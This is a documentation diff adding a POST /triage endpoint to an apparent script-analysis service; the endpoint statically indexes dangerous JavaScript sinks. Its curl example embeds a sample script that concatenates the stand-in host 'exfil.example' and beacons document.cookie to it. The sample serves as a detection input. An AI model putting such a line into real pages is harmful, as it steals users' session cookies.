@@ -204,6 +204,26 @@ Either `url` or `content` must be provided. `content` takes precedence if both a
 
 **Response:** same shape as `/render` with `output: null` and `mobile_output: null`; only `threat_report` is populated.
 
+### `POST /triage`
+
+Sink index for a batch of scripts: every dangerous operation (string `exec`, `network`, `beacon`, `navigate`, `dom_write`, `src_assign`, `script_inject`, `form_action`, `href_assign`, `cookie_write`, `storage`, `clipboard`, `wallet_rpc`), with its argument **resolved** as far as static analysis allows and the span of the **enclosing function**. This is the technique jsluice-style tooling uses: parse once, find the sinks, read outward.
+
+- **Content only:** there is no `url` field, so nothing is fetched (no SSRF surface). Nothing is executed (oxc parse plus `oxc_semantic`).
+- **Argument resolution:** string/template literals, `+` concatenation, and identifiers declared with an initializer and **never reassigned** (proved via `oxc_semantic` reference flags). Anything else is `EXPR`, and `complete` is `false` when any hole remains.
+- **Offsets** (`start`/`end`/`func_start`/`func_end`) are Unicode **code-point** offsets, the same as Python string indices.
+- **Limits:** ≤ 64 scripts per request (otherwise 413). Scripts over 2 MB are returned with `"skipped": "too_large"`. The 4 MB request body limit applies, plus a 30 s wall clock. The endpoint has its **own** concurrency limit (2), separate from `/render`/`/analyse`, so it never queues behind a render.
+- **Caps:** 2,000 sinks per script (`truncated: true` beyond that), 500 endpoints, and 512 characters per resolved argument. `parse_failed: true` when oxc cannot produce an AST (e.g. JSON-LD or HTML served as a script).
+
+```bash
+curl -s -X POST http://localhost:8080/triage -H "Content-Type: application/json" -H "X-API-Key: s3cr3t" \
+  -d '{"scripts":[{"id":"a","content":"const h=\"https://ex\"+\"fil.example\"; navigator.sendBeacon(h+\"/c\", document.cookie);"}]}'
+```
+
+```json
+{"results":[{"id":"a","sinks":[{"kind":"beacon","target":"navigator.sendBeacon","arg":"https://exfil.example/c","complete":true,
+  "start":36,"end":81,"func_start":0,"func_end":82}],"endpoints":["https://exfil.example/c"],"parse_failed":false,"truncated":false}]}
+```
+
 ### `POST /solve`
 
 Loads a URL in the confined browser, lets whatever gate stands in front of the content play out, and returns **the document the server actually served** plus the path the browser was sent down. Two uses:
